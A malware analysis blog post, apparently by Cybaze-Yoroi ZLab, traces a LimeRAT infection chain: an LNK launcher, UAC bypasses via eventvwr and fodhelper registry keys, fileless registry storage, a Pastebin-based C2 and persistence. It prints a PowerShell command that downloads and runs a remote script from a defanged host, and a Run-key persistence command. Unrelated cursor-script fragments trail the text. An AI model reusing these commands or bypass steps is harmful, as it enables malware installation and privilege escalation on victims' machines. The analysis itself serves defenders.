<h2 class="wp-block-heading">Introduction</h2>



<p>Few days ago, Cybaze-Yoroi ZLab team came across an interesting infection chain leveraging several techniques able to defeat traditional security defences and hiding a powerful inner payload able to seriously threaten its victims. <br></p>



<div class="wp-block-image"><figure class="alignright is-resized"><img loading="lazy" decoding="async" src="https://lh3.googleusercontent.com/LSdNAD_OP3xgMfIL4NtMEJVj7KNPRTGqSQA1hsRWyZATDeCplLtcRCpWIfvzxXLMRATzDHrXtA4HWRxdoay5juqaGiG8lA25wkFq7RluNTrot34zwQbHUmGrD-OeSCjXHMnK2F8" alt="" width="276" height="129"/></figure></div>



<p>The whole infection chain was originated by a LNK file, a technique used by advanced attackers and APTs too, for this reason we decided to have a deeper look into these malicious samples revealing another infamous abuse of open-source projects. Too many times turned into fully-featured malware implants by unethical hackers and cyber criminals.</p>



<h2 class="wp-block-heading">Technical Analysis</h2>



<p>The origin of the infection chain is a simple LNK file, a technique originally adopted by <a href="https://blog.yoroi.company/research/new-cozy-bear-campaign-old-habits/">state sponsored</a> and advanced actors, designed to download and run a powershell file named “rdp.ps1” from a remote location through the command: </p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Windo 1 $wm=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWVY'));sal g $wm;$IF=((New-Object Net.WebClient)).DownloadString('https://hacks4all[.net/rdp.ps1');g $I</pre>



<p>The retrieved Powershell script works as dropper of the whole infection chain.<br></p>



<table class="wp-block-table"><tbody><tr><td><strong>Sha256</strong></td><td>141fd1e267a092d5525ba91b5817c324ccd9ec20a0d5c6b5cdfb899ca5cda039</td></tr><tr><td><strong>Threat</strong></td><td>Powershell Dropper</td></tr><tr><td><strong>Brief Description</strong></td><td>Powershell dropper of LimeRAT</td></tr><tr><td><strong>Ssdeep</strong></td><td>1536:7Tty9ugHMeQdOaqZyyhWI6WGf6J705549G:7Ti2dOaqZyyhp8fQkCG</td></tr></tbody></table>



<p>This script firstly retrieves the version of the Windows OS installed on the target machine using the “Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Version” &nbsp;command. Then, depending on the returned value, it runs a couple of privilege escalation exploits able to bypass the UAC (User Account Control) feature, a well known security mechanism introduced since Vista to avoid unauthorized system configuration changes. The first one targets the Windows versions lower than 8.1, abusing a design flaw on the <a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank" rel="noopener">EventViewer process</a> to execute a command with higher privileges.<br></p>



<p>This exploit works quite easily: the malware gains access to the registry key “HKCU:\Software\Classes\mscfile\shell\open\command” and inserts here the command to run its own payload, forcing its execution through the “eventvwr.exe” process which, due to a security flaw, executes it with the maximum privileges available.<br></p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh6.googleusercontent.com/AxGkkvKvcDIScPWPjWv-Hkis8ipSpkce3aChyNgZSCzueYZ9fCp_D4PnwvMSog2av1XEv55uxZ9iTaloIS-d-MRMVlj67NVxVGAts9jMjH7tie-g3rJf7MsAaoI6eFGXaPfbFaM" alt=""/></figure></div>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh4.googleusercontent.com/xzmnL75MM10vnEhvp79BDcJpg-1NfUyVT-qpp2Ux0j_isl5tmQQia2EZvcS0I9twKe1K136YXelDPO5soIHNLiW2_wHWMN99--Nr60NKYd8tHuS5kdosWrawty5cqqVr1_SBUE0" alt=""/><figcaption>Figure 1: Check of the target Windows version and preparation for the eventvwr.exe process exploit</figcaption></figure></div>



<p>The second exploit targets Windows 10 operating systems: it leverages a vulnerability inside the <a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" target="_blank" rel="noopener">FODhelper process</a>. The principle of this exploit is similar to the previous one, but the accessed registry key is “HKCU:\Software\Classes\ms-settings\Shell\Open\command” and the vulnerable process is “fodhelper.exe”.<br></p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh4.googleusercontent.com/-k0CZtptveLFC0pd66S96G9XNyz7_Lef9FVwc-HiP3XG95BHSsnMbpgYRwO5GqCyf-DX2M0bXpuVfc-drpqdSZo_Frpym_2XLjJCvyFuadJqwBfpKNjazeJ31cduoCvfTN0kNeY" alt=""/></figure></div>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh5.googleusercontent.com/heTgyrSVCSe9oJrr2WZJVtb7irprjnlHvElfv-S6X3ADo6xMYSSCMErAgAiBac2Rb5d8nrZ9TYwFWjAoEHl7aC7DQz8QOsznkPv4tMO_Nmmn2jpKVjCcU0K290vvLiVsMR2n8P8" alt=""/><figcaption>Figure 2: Check of the target Windows version and preparation for the fodhelper.exe process exploit</figcaption></figure></div>



<p>These two exploits are both used to run a Powershell payload which, after its decoding, results in the invocation of an additional JavaScript code. The body of this script contains a unique anonymous function embedding other sub-functions and an enormous obfuscated variable.<br></p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh3.googleusercontent.com/gq5TU5xE81kJqN7a249aFEQkK4lhqPpe8H3_DVfu3rciMd9vXKQnm57lJWFu8bHUsMEPxDaitksN5gwBuHtGuotwKD2ED6vLFKpBN2G2mPl19ZBN52OXpfuWLNAODkubL4QXZ0c" alt=""/><figcaption>Figure 3: Payload encoded in Base64 format and obfuscated with a custom subroutine</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh3.googleusercontent.com/5eFyWC7Roj-hI0gZ-ZvEtTVlxmV-VYF5v3kvYBeeqs03h6RWujbGulm5jnvFoyjaGC_df8aXxh3qB8p7sUDoH9iaBomSHtTpqFju8QXNpJAIQV6FLlCmRilRyyZ2x0PI4qBMkiI" alt=""/><figcaption>Figure 4: Piece of de-obfuscation subroutine</figcaption></figure></div>

<h3 class="wp-block-heading">The Payload<br></h3>



<div class="wp-block-image"><figure class="alignleft is-resized"><img loading="lazy" decoding="async" src="https://lh6.googleusercontent.com/mk8_g2Frk_iT5uyTcJISTtPMwrX7zXVmop2CDHexJInlNVMkTJWMhUUP4uSSJbKnL8-BqPX5k45qWQoXpXyp2on2rZaqzo2B0vIuABssOtAUpX2DC6zoEenlhPZJQckIFcv056s" alt="" width="254" height="249"/><figcaption>Figure 6. Static payload data</figcaption></figure></div>



<p>The installed payload actually is a Base64 encoded PE32 file, file-lessly stored within the registry hive to avoid antivirus detection. It is written in C# and requires at least the .NET framework 3.2 to run. Exploring the malware code, we detected multiple evidence indication of the possible belonging malware family: LimeRAT.<br></p>



<p><a href="https://github.com/NYAN-x-CAT/Lime-RAT" target="_blank" rel="noopener">LimeRAT</a> is a powerful Remote Administration Tool publicly available to any internet user, it is an open-source project freely available on Github. Comparing its source code to the decompiled sample we were able to confirm there is a high compatibility between the payload and this open-source remote administration tool.<br></p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh5.googleusercontent.com/uaLflLLk111Z2aNzQSlbVJi2Ml3bstSz8f1KdjtNuJH0BEwtLlIrFIm7QRFTDigCQqofIwH0fS1knu1An698pCVig_3z5MoLBftxme_LNxJv4TJnxi9bFnDBBVdEy-RFxmksb-Y" alt=""/><figcaption>Figure 7: Decompiled code (on the left) and source code (on the right) on Github platform</figcaption></figure></div>



<p>The function reported above closely matches the open-source code. It also codes an interesting feature of the implant, in fact it allows the malware to register itself as “Critical Process” and when the user tries to kill it, a Blue Screen of Death (BSoD) is raised on the victim machine. Besides this peculiar tricks, the malware has a complete set of very powerful and dangerous capabilities, such as:<br></p>



<ul class="wp-block-list"><li>USB drive propagation, infecting all files and folders on USB drivers.</li><li>Evasive startup methods (fileless) to avoid AV detection.</li><li>Virtual machines and analysis box awareness to avoid detection.</li><li>Stealer and CryptoStealer module to steal cryptocurrency wallets and saved passwords.</li><li>Keylogger module</li><li>Backdoor and RDP access.</li></ul>



<h3 class="wp-block-heading">C2 Server</h3>



<div class="wp-block-image"><figure class="alignright is-resized"><img loading="lazy" decoding="async" src="https://lh6.googleusercontent.com/06ekrbZxcqTBwgki3LASNwBWnEsrFKYaCmDlfKy6jOH1_rZtpQqLXCh1ghgb5hRropACRtx81btv2__J0Y9HegDJBqzsY6EsR4YNbQsPhI-R8GQ9-RmfoFhe7pxsslZF30JkAh8" alt="" width="330" height="150"/><figcaption>Figure 8. C2 retrieval</figcaption></figure></div>



<p>The malware command and control infrastructure abuses the Pastebin service to ensure resilience, in fact the malware dynamically retrieves the real C2 destination address from a pastie over an encrypted HTTPS channel. <br></p>



<p>Also, the attacker behind this sample leans on the Dynamic DNS service “warzonedns.com”, pointing to the 213.183.58[.10 IP address located in Russia. <br></p>



<p>Investigating this network destination we figured out the registrar email, “anthony.marshall.1986[@gmail[.com”, is well known: this email appears in another AdWind/JRat <a href="https://abuse.ch/blog/adwind-a-cross-plattform-rat/" target="_blank" rel="noopener">malicious campaign</a> dated back in 2017, suggesting this malicious actor is active for a long time. <br></p>



<h3 class="wp-block-heading">Persistence Mechanisms</h3>



<p>This sample also uses multiple<strong> </strong>persistence mechanisms, making more difficult to an improvised incident responder to get rid of the infection, because the choice to add this redundancy helps to ensure the infection last longer. In detail, it leverages at least three different persistence tricks, copying itself in three different paths:<br></p>



<ul class="wp-block-list"><li>C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</li><li>C:\Users\public\</li><li>%APPDATA%\Local\Temp\</li></ul>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh5.googleusercontent.com/NWUDRSZ1mTLvByCv5qd-g0p1dVaRU9d56DBf8zEr9oseZug0XqaS1l8XmmW4W90DdrJYo62dFauwE_R24Y39Q6bDDUxPLB9iPdGHHOuvpTqRO7F59yymi0y8504C4cc0gRZNy_Y" alt=""/><figcaption>Figure 9: The persistence mechanisms of the malware</figcaption></figure></div>



<p>The JavaScript code is executed through the following powershell command:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -windowstyle hidden -noexit -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -name 'FileName' -value 'C:\Users\admin\AppData\Local\Temp\fuw.js' -PropertyType String -Force;"</pre>



<h2 class="wp-block-heading">Conclusion</h2>



<p>The analyzed case evidences how open-source projects are often abused by cyber criminals to pursue their malicious objectives and, even if the malware code and behaviour are well known, how those threat families are constantly re-arranged to avoid basic security controls, along with the observation of how cyber-criminals challengingly insist in their illicit operations over the years, refining their techniques to penetrate companies boundaries.<br></p>

            self.$dot.style.left = self.endX + 'px';

            self.cursorVisible = true;
            self.toggleCursorVisibility();
            self.$dot.style.opacity = 1;
            self.$outline.style.opacity = 1;

            self.toggleCursorVisibility();
            self.$dot.style.opacity = 0;
